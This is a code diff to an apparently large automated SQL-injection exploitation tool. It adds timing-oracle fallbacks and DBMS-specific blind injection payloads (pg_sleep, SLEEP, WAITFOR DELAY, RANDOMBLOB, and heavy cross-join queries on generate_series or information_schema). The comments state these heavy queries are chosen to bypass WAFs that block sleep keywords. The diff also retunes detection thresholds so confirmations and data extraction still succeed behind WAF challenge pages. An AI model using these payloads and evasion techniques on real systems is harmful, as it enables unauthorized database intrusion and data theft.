@@ -47599,7 +47599,17 @@ class Enumerator:
                 try:
                     _san_true = await _bool_oracle("1=1")
                     _san_false = await _bool_oracle("1=2")
-                    if _san_true is True and _san_false is False:
+                    # FIX-BUG3: Proper oracle sanity check:
+                    # - `is True`/`is False` fails for numpy.bool_, integer 1/0, or any
+                    #   non-singleton True/False returned by oracle wrappers.
+                    # - None means "no result / indeterminate" (WAF block, timeout) — treat
+                    #   as inconclusive: if 1=1 returns None, oracle is unreachable; if 1=2
+                    #   returns None, oracle may still work (false condition blocked by WAF
+                    #   is ambiguous — could be oracle not seeing it, or true condition only).
+                    # Accept only when: 1=1 is truthy (not None, not False) AND 1=2 is
+                    # explicitly falsy (False or 0, but NOT None which is indeterminate).
+                    if (_san_true is not None and _san_false is not None
+                            and bool(_san_true) and not bool(_san_false)):
                         _eval_fn = _bool_oracle
                         _oracle_name = "mse_boolean"
                     else:
@@ -47651,20 +47661,126 @@ class Enumerator:
                 LOG.debug(f"[_extract_str] Self-calibration failed: {_self_ceo_err}")
 
         if not _eval_fn:
-            # FIX R7-B: Log a clear warning instead of silently returning "".
-            # Previously every extraction call returned "" with no indication of
-            # WHY — making debug impossible and hiding the missing oracle setup.
-            # ConditionalErrorOracle calibration (from V25/V14 extraction path)
-            # must succeed before _extract_str can work.
+            # FIX-BUG7: Timing oracle fallback for HQ/T/TH/BT/S/ST techniques.
+            # When detection confirmed injection via timing but no boolean/error oracle
+            # calibrated (e.g. WAF-challenge baseline returns 400 for all probes),
+            # build a timing-based boolean oracle from the confirmed detection payload.
+            # This oracle wraps each extraction condition in a DBMS-specific timing
+            # expression (pg_sleep / IF SLEEP / WAITFOR / RANDOMBLOB / heavy-join)
+            # and evaluates True iff elapsed_ms >= threshold.
+            _result_tf = getattr(self, 'result', None)
+            _tech_tf = getattr(_result_tf, 'technique', '') if _result_tf else ''
+            _timing_techs_tf = ('T', 'TH', 'HQ', 'BT', 'S', 'ST', 'NV', 'WB', 'EX', 'HY')
+            if _tech_tf in _timing_techs_tf:
+                _t_sec_tf = float(getattr(self.config, 'time_sec', 5) or 5)
+                _base_ms_tf = (self.baseline.get('mean_timing', 200)
+                               if isinstance(self.baseline, dict) else 200)
+                # Threshold = baseline + 50% of sleep duration (conservative but reliable)
+                _t_thresh_tf = _base_ms_tf + _t_sec_tf * 500.0
+                _det_payload_tf = getattr(_result_tf, 'payload', '') or ''
+                _det_tc_tf = (getattr(_result_tf, 'tamper_chain', None)
+                              or self.tamper_chain or [])
+                _det_param_tf = (self._injection_param
+                                 or getattr(_result_tf, 'param', None) or '')
+                # Derive injection prefix/suffix from confirmed detection payload
+                _tc_clean_tf = _re.sub(r'/\*[^*]*\*/', ' ', _det_payload_tf).strip()
+                _sfx_m_tf = _re.search(r'\s*(?:--\s*-?|-#|#)\s*$', _tc_clean_tf)
+                _tp_sfx_tf = _sfx_m_tf.group(0) if _sfx_m_tf else '-- -'
+                _tp_body_tf = (_tc_clean_tf[:len(_tc_clean_tf) - len(_tp_sfx_tf)].rstrip()
+                               if _sfx_m_tf else _tc_clean_tf)
+                _pfx_m_tf = _re.search(r'\bAND\b|\bOR\b', _tp_body_tf, _re.I)
+                _tp_pfx_tf = ((_tp_body_tf[:_pfx_m_tf.start()].rstrip() + ' ')
+                              if _pfx_m_tf else "' ")
+                _dbms_tf = self.dbms
+                _eng_tf = self.engine
+                _meth_tf = self.method
+                _url_tf = self.url
+                _data_tf = self.data
+                _dfmt_tf = self.data_fmt
+                _orig_tf = self.original
+
+                def _build_timing_payload_tf(_cond, _pfx=_tp_pfx_tf, _sfx=_tp_sfx_tf,
+                                              _dbms=_dbms_tf, _t=_t_sec_tf,
+                                              _tech=_tech_tf):
+                    """Build DBMS-specific timing payload for extraction condition.
+                    For HQ technique, uses heavy-query (generate_series/cross-join) instead
+                    of pg_sleep/SLEEP to bypass WAFs that block sleep-based timing."""
+                    if _dbms in ('PostgreSQL', 'CockroachDB', 'Amazon Redshift', 'YugabyteDB'):
+                        if _tech == 'HQ':
+                            # HQ = heavy query — use generate_series which WAFs don't block
+                            # CASE WHEN gates the computation: true→5M rows (slow), false→1 row (fast)
+                            _rows = max(1000000, min(int(_t * 1000000), 10000000))
+                            return (f"{_pfx}AND (SELECT count(*) FROM "
+                                    f"generate_series(1,CASE WHEN ({_cond}) "
+                                    f"THEN {_rows} ELSE 1 END))>0{_sfx}")
+                        else:
+                            return (f"{_pfx}AND (CASE WHEN ({_cond}) "
+                                    f"THEN (SELECT CAST(pg_sleep({_t}) AS TEXT)) "
+                                    f"ELSE (SELECT CAST(pg_sleep(0) AS TEXT)) END) IS NOT NULL{_sfx}")
+                    elif _dbms in ('MySQL', 'MariaDB', 'TiDB'):
+                        if _tech == 'HQ':
+                            # MySQL HQ: heavy cross-join on information_schema
+                            return (f"{_pfx}AND (SELECT count(*) FROM "
+                                    f"information_schema.tables a,information_schema.tables b "
+                                    f"WHERE ({_cond}))>=0{_sfx}")
+                        else:
+                            return f"{_pfx}AND IF(({_cond}),SLEEP({_t}),0){_sfx}"
+                    elif _dbms == 'MSSQL':
+                        if _tech == 'HQ':
+                            # MSSQL HQ: heavy cross-join on sys.objects
+                            return (f"{_pfx}AND (SELECT count(*) FROM "
+                                    f"sys.objects a,sys.objects b "
+                                    f"WHERE ({_cond}))>0{_sfx}")
+                        else:
+                            _mm = int(_t) // 60; _ss = int(_t) % 60
+                            return f"{_pfx}; IF ({_cond}) BEGIN WAITFOR DELAY '0:{_mm:02d}:{_ss:02d}' END{_sfx}"
+                    elif _dbms == 'SQLite':
+                        _blob = min(int(_t * 400_000), 4_500_000)
+                        return (f"{_pfx}AND (CASE WHEN ({_cond}) "
+                                f"THEN LIKE(UPPER(HEX(RANDOMBLOB({_blob}))),'%ZZZZ%') "
+                                f"ELSE 1 END){_sfx}")
+                    elif _dbms == 'Oracle':
+                        _rows = max(1000, min(int(_t * 50000), 5000000))
+                        return (f"{_pfx}AND (SELECT CASE WHEN ({_cond}) "
+                                f"THEN (SELECT COUNT(*) FROM all_objects A, all_objects B WHERE ROWNUM<{_rows}) "
+                                f"ELSE 0 END FROM DUAL)>=0{_sfx}")
+                    else:
+                        return None
+
+                async def _timing_eval_fn_tf(condition,
+                                              _e=_eng_tf, _m=_meth_tf, _u=_url_tf,
+                                              _d=_data_tf, _df=_dfmt_tf,
+                                              _p=_det_param_tf, _o=_orig_tf,
+                                              _tc=_det_tc_tf, _thresh=_t_thresh_tf,
+                                              _t=_t_sec_tf, _build=_build_timing_payload_tf):
+                    _tpay = _build(condition)
+                    if _tpay is None:
+                        return None
+                    try:
+                        _fp_tf = await asyncio.wait_for(
+                            _send_injected(_e, _m, _u, _d, _df, _p, _o + _tpay, _tc),
+                            timeout=max(_t * 3.0, 30.0))
+                        if _fp_tf is None:
+                            return None
+                        return _fp_tf.elapsed_ms >= _thresh
+                    except Exception:
+                        return None
+
+                _eval_fn = _timing_eval_fn_tf
+                _oracle_name = "timing_fallback"
+                print(f"[+] [Extract] Timing fallback oracle active ({self.dbms}, "
+                      f"t={_t_sec_tf}s, thresh={_t_thresh_tf:.0f}ms)", flush=True)
+
+        if not _eval_fn:
+            # All oracle paths exhausted — log clearly and return empty.
             LOG.warning(
                 f"[_extract_str] No oracle available for SQL: {sql[:60]!r} "
-                "(ConditionalErrorOracle not calibrated and MSE not wired). "
-                "Extraction will return empty string.  "
-                "Check that oracle calibration ran successfully.")
+                "(ConditionalErrorOracle not calibrated, MSE not wired, timing fallback N/A). "
+                "Extraction will return empty string.")
             print(
-                f"[!] [Extract] No boolean oracle available for '{sql[:40]}...'\n"
-                "    → extraction impossible without a working oracle.\n"
-                "    → Ensure ConditionalErrorOracle calibrated successfully.",
+                f"[!] [Extract] No oracle available for '{sql[:40]}...'\n"
+                "    → extraction impossible (error oracle + boolean oracle + timing fallback all failed).\n"
+                "    → Check oracle calibration and detection technique.",
                 flush=True)
             return ""
 
@@ -107008,19 +107124,21 @@ class TechniqueCascadeEngine:
             elif tech in ("T", "BT", "TH"):
                 print(f"[*]   [PCV] Body canary strong BUT technique={tech} (timing)  SLEEP doesn't change body, need timing proof...", flush=True)
             else:
-                # FIX: For error pages (4xx/5xx), require SQL error fingerprint OR empty payload check
-                # to avoid false positives from content delivery/routing differences
-                if _bl_status >= 400 and not (_c_pass or _e_pass):
-                    print(f"[*]   [PCV] Body canary strong BUT error page ({_bl_status}) with no SQL errors/logic  likely false positive", flush=True)
-                    # BUG-V214-C FIX: explicit reject — fall-through produced misleading output
-                    # (Check A shown as PASS while subsequent non-timing checks all fail for
-                    # error pages, eventually reaching the final REJECTED at the bottom).
-                    # For non-timing techniques on error pages without SQL error/logic proof,
-                    # there is no check that will confirm — return False immediately.
+                # FIX-BUG1-ERRORPAGE: On 4xx/5xx-baseline targets (WAF challenge pages),
+                # a strong body gap is genuine injection evidence even without SQL errors (C/E).
+                # The gap measures sim(true_probe, baseline) vs sim(false_probe, baseline)
+                # across injection-specific SQL conditions — it IS injection evidence regardless
+                # of HTTP status. Only reject WEAK gaps on error pages to prevent FPs.
+                # Threshold: gap ≥ 0.40 (> 2× typical boolean detection threshold of 0.20)
+                # is strong enough to confirm. gap=0.500 seen in real WAF-challenge scans is 2.5×.
+                _bool_det_thresh_a = getattr(self, '_dynamic_gap', 0.20)
+                _strong_gap_min_a = max(0.40, _bool_det_thresh_a * 2.0)
+                _is_strong_body_gap_a = _a_gap >= _strong_gap_min_a
+                if _bl_status >= 400 and not (_c_pass or _e_pass) and not _is_strong_body_gap_a:
+                    print(f"[*]   [PCV] Body canary weak gap={_a_gap:.3f} (need ≥{_strong_gap_min_a:.2f}) on error page ({_bl_status}) with no SQL errors/logic  likely false positive", flush=True)
                     return False, 0, _details
-                elif _is_error_page and _a_gap < 0.85:
-                    print(f"[*]   [PCV] Body canary gap={_a_gap:.3f} on error page ({_bl_status}, {_bl_size}B)  too low, need gap>1.20 or timing...", flush=True)
-                    # BUG-V214-C FIX: explicit reject for insufficient gap on error page.
+                elif _is_error_page and _a_gap < 0.85 and not _is_strong_body_gap_a:
+                    print(f"[*]   [PCV] Body canary gap={_a_gap:.3f} on error page ({_bl_status}, {_bl_size}B)  too low (need ≥{_strong_gap_min_a:.2f})", flush=True)
                     return False, 0, _details
                 else:
                     # Block body-size-only confirmation for UNION when sentinel
@@ -113151,7 +113269,12 @@ class TechniqueCascadeEngine:
                     # easily exceeded by CDN-cold without injection (fp=400ms, gap=200ms>160ms).
                     # Use 0.80×threshold so CDN-cold fp needs to show a large gap above baseline
                     # that only genuine injection + CDN-cold can produce.
-                    if _fp1_gap > time_threshold * 0.80 and fp2.elapsed_ms < _bl_ms2 * 1.10:
+                    # FIX-BUG6: Raised 1.10× to 1.75× for CDN-warm detection.
+                    # CDN-warm fp2 arrives at ~170-220ms (below baseline*1.10=220ms);
+                    # however CDN-cached injection responses can arrive at up to 350ms.
+                    # Old 1.10 threshold (220ms) rejected genuine CDN-cached responses at 351ms.
+                    # New 1.75 threshold (350ms) correctly captures CDN-warm range up to 350ms.
+                    if _fp1_gap > time_threshold * 0.80 and fp2.elapsed_ms < _bl_ms2 * 1.75:
                         print(f"    [T-confirm] CDN-single: fp1_gap={_fp1_gap:.0f}ms (>{time_threshold*0.80:.0f}ms), "
                               f"fp2={fp2.elapsed_ms:.0f}ms CDN-warm (<{_bl_ms2*1.10:.0f}ms)  CDN-cached injection", flush=True)
                         _conf_abs = True
@@ -114440,7 +114563,10 @@ class TechniqueCascadeEngine:
                                       if isinstance(baseline, dict) else 50, 50)
                         time_threshold = _th_mean + max(_th_sl_v * 1000 * 0.50,
                                                         _th_std * 1.5)
-                _th_waf_fast = (_waf_blocked and fp.elapsed_ms < _th_mean * 1.3)
+                # FIX-BUG5: Raised 1.3× to 1.8× — CDN edge nodes return ~320ms for blocked
+                # probes; 200ms × 1.3 = 260ms wrongly classified CDN blocks as non-WAF.
+                # 200ms × 1.8 = 360ms correctly captures CDN-routed WAF blocks up to ~360ms.
+                _th_waf_fast = (_waf_blocked and fp.elapsed_ms < _th_mean * 1.8)
                 _th_verdict = (" HIT" if fp.elapsed_ms >= time_threshold else
                               " WAF-blocked" if _th_waf_fast else
                               " elevated" if fp.elapsed_ms > _th_mean * 1.5 else
@@ -118553,7 +118679,8 @@ class UniversalScanOrchestrator:
                                                                              _bl=_bl_mean_timing,
                                                                              _db=_confirmed_dbms,
                                                                              _rc=_ito_req_count,
-                                                                             _ipfx=_timing_inj_pfx):
+                                                                             _ipfx=_timing_inj_pfx,
+                                                                             _det_tech=_det_tech):
                                                 try:
                                                     # BUG-INLINE-TIMING-ORACLE-MISSING-INJ-CTX-PREFIX FIX:
                                                     # All DBMS branches now use f"{_o}{_ipfx} AND ..." where
@@ -118565,7 +118692,13 @@ class UniversalScanOrchestrator:
                                                     # rather than being embedded inside a string literal.
                                                     if _db in ('MySQL', 'MariaDB', 'TiDB'):
                                                         # BUG-ITO-CRDB-YG-SYBASE-BRANCH FIX: added TiDB (MySQL-compat: IF/SLEEP work)
-                                                        _pay = f"{_o}{_ipfx} AND IF({_cond},SLEEP({_ts}),0)-- -"
+                                                        if _det_tech == 'HQ':
+                                                            # HQ: heavy cross-join (WAF-safe: no SLEEP keyword)
+                                                            _pay = (f"{_o}{_ipfx} AND (SELECT count(*) FROM "
+                                                                    f"information_schema.tables a,information_schema.tables b "
+                                                                    f"WHERE ({_cond}))>=0-- -")
+                                                        else:
+                                                            _pay = f"{_o}{_ipfx} AND IF({_cond},SLEEP({_ts}),0)-- -"
                                                     elif _db in ('PostgreSQL', 'CockroachDB', 'YugabyteDB', 'Amazon Redshift'):
                                                         # BUG-ITO-CRDB-YG-SYBASE-BRANCH FIX: CockroachDB/YugabyteDB are PG-wire-compatible;
                                                         # pg_sleep() works on both. The previous else branch emitted SLEEP() which does
@@ -118580,7 +118713,15 @@ class UniversalScanOrchestrator:
                                                         # subquery form (SELECT pg_sleep(N)). CAST(pg_sleep(N) AS TEXT) coerces void
                                                         # to an empty string — a valid scalar — before IS NOT NULL evaluates it.
                                                         # timing_payload() (line 134107) already uses this CAST form; now consistent.
-                                                        _pay = f"{_o}{_ipfx} AND (CASE WHEN ({_cond}) THEN (SELECT CAST(pg_sleep({_ts}) AS TEXT)) ELSE (SELECT CAST(pg_sleep(0) AS TEXT)) END) IS NOT NULL-- -"
+                                                        # FIX-BUG7-HQ-PG: For HQ technique, use generate_series (WAF-safe) instead of
+                                                        # pg_sleep which WAFs that blocked HQ-detected targets typically also block.
+                                                        if _det_tech == 'HQ':
+                                                            _hq_rows = max(1000000, min(int(_ts * 1000000), 8000000))
+                                                            _pay = (f"{_o}{_ipfx} AND (SELECT count(*) FROM "
+                                                                    f"generate_series(1,CASE WHEN ({_cond}) "
+                                                                    f"THEN {_hq_rows} ELSE 1 END))>0-- -")
+                                                        else:
+                                                            _pay = f"{_o}{_ipfx} AND (CASE WHEN ({_cond}) THEN (SELECT CAST(pg_sleep({_ts}) AS TEXT)) ELSE (SELECT CAST(pg_sleep(0) AS TEXT)) END) IS NOT NULL-- -"
                                                     elif _db in ('MSSQL', 'Sybase'):
                                                         # BUG-ITO-CRDB-YG-SYBASE-BRANCH FIX: added Sybase (T-SQL compatible;
                                                         # uses CROSS JOIN heavy-query same as MSSQL — WAITFOR DELAY is also valid
@@ -129597,13 +129738,28 @@ class MultiStrategyExtractor:
 
         # Majority voting: send 3 times, take majority result
         _votes = []
+        _err_status_cal = self._err_info.get("err_status")
+        _ok_status_cal  = self._err_info.get("ok_status")
         for _round in range(3):
             fp, _ = await self._timed(p)
             if fp is None:
                 continue
+            _fp_status = getattr(fp, "status_code", None)
+            # FIX-BUG8: WAF-block guard — when the probe is blocked by WAF (returns
+            # 400/403/429 that is neither the calibrated err_status nor ok_status),
+            # the response carries no SQL error signal; treating it as True/False
+            # corrupts the oracle and produces garbage extraction.  Return None for
+            # this round so majority voting excludes it rather than amplifying noise.
+            # Also guards against the pathological case where err_status==ok_status
+            # (both 400 during calibration): if WAF now returns a different 4xx, skip.
+            _waf_block_statuses = {400, 403, 406, 429, 503}
+            if (_fp_status in _waf_block_statuses
+                    and _fp_status != _err_status_cal
+                    and _fp_status != _ok_status_cal):
+                continue  # WAF blocked the probe — exclude from vote, not a DB signal
             _diff = self._err_info["diff"]
             if _diff == "status":
-                _vote = getattr(fp, "status_code", None) == self._err_info["err_status"]
+                _vote = _fp_status == _err_status_cal
             elif _diff == "header":
                 # BUG-FRESH-V214-1 FIX: Use the specific header that differed during
                 # probe detection instead of status-code comparison. When err_status ==
@@ -130406,7 +130562,24 @@ class MultiStrategyExtractor:
                 await asyncio.sleep(0.2)
                 r2 = await asyncio.wait_for(_fn("1=2"), timeout=20)
                 if not (r1 and not r2):
-                    print(f"[MSE]  {name} basic validation FAILED (1=1{r1}, 1=2{r2})", flush=True)
+                    # FIX-BUG4: Detect WAF-corruption: when the WAF returns the same 4xx
+                    # response for every probe (true and false), both r1 and r2 may be True.
+                    # In that case, also probe a third clearly-false condition (2=3) to
+                    # distinguish WAF-uniform (both True: WAF-corrupted) from oracle-inverted
+                    # (r1=False: oracle flipped polarity). WAF-corrupted oracles are unusable
+                    # and blacklisted; genuinely inverted ones are also unusable here but for
+                    # a different reason (polarity needs flip at the call site).
+                    _r3_waf = None
+                    if r2:  # r2 True suggests WAF or oracle corruption
+                        try:
+                            await asyncio.sleep(0.1)
+                            _r3_waf = await asyncio.wait_for(_fn("2=3"), timeout=20)
+                        except Exception:
+                            pass
+                    if r2 and _r3_waf:
+                        print(f"[MSE]  {name} WAF-corrupted (1=1→{r1}, 1=2→{r2}, 2=3→{_r3_waf}) — all conditions return True; oracle unusable on this target", flush=True)
+                    else:
+                        print(f"[MSE]  {name} basic validation FAILED (1=1→{r1}, 1=2→{r2})", flush=True)
                     # Cache this failure so future MSE instances skip re-probing
                     if not hasattr(self.config, "_mse_oracle_blacklist"):
                         self.config._mse_oracle_blacklist = set()
@@ -133999,6 +134172,9 @@ async def _time_based_extract_inner(engine, config, result, sql: str,
     """Inner implementation of _time_based_extract — called only from the locked wrapper."""
     t = getattr(config, "time_sec", 5)
     _base_time = baseline.get("mean_timing", 200) if baseline else 200
+    # Capture detection technique so timing_payload() can choose HQ variants (generate_series)
+    # vs sleep-based variants (pg_sleep/SLEEP) — both are closed over by timing_payload().
+    _tp_technique = getattr(result, 'technique', '') or ''
     # Start with theoretical threshold; overwrite with calibrated value below.
     timing_thresh = min(_base_time, 2000) + t * 700
     # Detect if WAF blocks > operator (detection tamper chain had between/greatest)
@@ -134077,6 +134253,12 @@ async def _time_based_extract_inner(engine, config, result, sql: str,
             # BUG-TBEXTRACT-TIDB-NOT-EXPLICIT FIX: added TiDB (MySQL-compatible;
             # IF() and SLEEP() both exist in TiDB — same approach as the v117 fix
             # for _inline_timing_oracle BUG-ITO-CRDB-YG-SYBASE-BRANCH).
+            # BUG-TBEXTRACT-MYSQL-HQ-SLEEP FIX: HQ technique uses cross-join heavy
+            # query (no SLEEP) so WAFs that block SLEEP() don't stop extraction.
+            if _tp_technique == 'HQ':
+                return (f"{_tp_pfx}AND (SELECT count(*) FROM "
+                        f"information_schema.tables a,information_schema.tables b "
+                        f"WHERE ({condition}))>=0{_tp_sfx}")
             return f"{_tp_pfx}AND IF(({condition}),SLEEP({t}),0){_tp_sfx}"
         elif dbms == "SQLite":
             # BUG-SQLITE-TIMING-PAYLOAD FIX (Req 8/10): The old cross-join of sqlite_master
@@ -134159,6 +134341,20 @@ async def _time_based_extract_inner(engine, config, result, sql: str,
             # FIX-PG-SLEEP-VOID: pg_sleep() returns void; IS NOT NULL on void is
             # unreliable (raises "function returning void cannot be used here" on some PG
             # versions). Cast to TEXT so the CASE expression has a non-void type.
+            # BUG-TBEXTRACT-PG-HQ-SLEEP FIX: When the confirmed technique is HQ, the
+            # WAF that blocked pg_sleep() during detection will also block pg_sleep()
+            # here. The HQ detection succeeded via generate_series heavy computation,
+            # so use the same mechanism for extraction. generate_series(1,N) with a
+            # large N causes CPU load proportional to N without triggering sleep-based
+            # WAF rules. CockroachDB and YugabyteDB also support generate_series().
+            # Amazon Redshift does NOT support generate_series — fall through to pg_sleep.
+            if _tp_technique == 'HQ' and dbms != "Amazon Redshift":
+                _hq_rows = max(1_000_000, min(int(t * 1_000_000), 10_000_000))
+                return (
+                    f"{_tp_pfx}AND (SELECT count(*) FROM "
+                    f"generate_series(1,CASE WHEN ({condition}) "
+                    f"THEN {_hq_rows} ELSE 1 END))>0{_tp_sfx}"
+                )
             return (
                 f"{_tp_pfx}AND (CASE WHEN ({condition}) "
                 f"THEN (SELECT CAST(pg_sleep({t}) AS TEXT)) "
